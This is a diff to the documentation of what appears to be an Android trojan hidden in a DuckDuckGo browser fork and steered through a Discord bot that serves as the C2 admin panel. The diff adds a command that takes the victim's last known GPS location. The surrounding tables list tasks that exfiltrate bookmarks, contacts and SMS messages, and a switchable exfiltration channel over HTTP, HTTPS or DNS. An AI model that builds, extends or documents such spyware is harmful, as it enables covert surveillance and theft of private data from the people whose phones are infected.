@@ -167,6 +167,7 @@ The Discord bot serves as the **admin panel** for the C2 server. It accepts comm
 | `/request-bookmarks` | `device` (optional, default `*`) | Queues a bookmarks exfiltration task |
 | `/request-contacts` | `device` (optional, default `*`) | Queues a contacts exfiltration task (requires READ_CONTACTS) |
 | `/request-sms` | `device` (optional, default `*`) | Queues an SMS inbox exfiltration task (requires READ_SMS) |
+| `/request-location` | `device` (optional, default `*`) | Returns the last cached GPS fix (no active tracking) |
 | `/set-communication-protocol` | `http` \| `https` \| `dns` (autocomplete) | Sets the exfiltration channel protocol |
 | `/queue-task` | `device`, `task_type`, `parameters` (autocomplete) | Queue a task for a device (or `*` for all) |
 | `/pending-tasks` | — | Show pending task counts per device |
@@ -236,6 +237,7 @@ trojan-ddg/trojan/
 | `request-bookmarks` | — | `SavedSitesRepository` | All bookmarks and favorites |
 | `request-contacts` | — | `ContactsContract.CommonDataKinds.Phone` | Contact names + phone numbers |
 | `request-sms` | — | `content://sms/inbox` ContentProvider | Up to 50 SMS messages (sender + body) |
+| `request-location` | — | `LocationManager.getLastKnownLocation()` | Lat/lon/accuracy from cached GPS or network fix |
 
 > **READ_CONTACTS** and **READ_SMS** are *dangerous* Android permissions — they are declared in the manifest but require the user to grant them at runtime. If not granted, the handler returns a `"permission denied"` result rather than crashing the beacon.
 
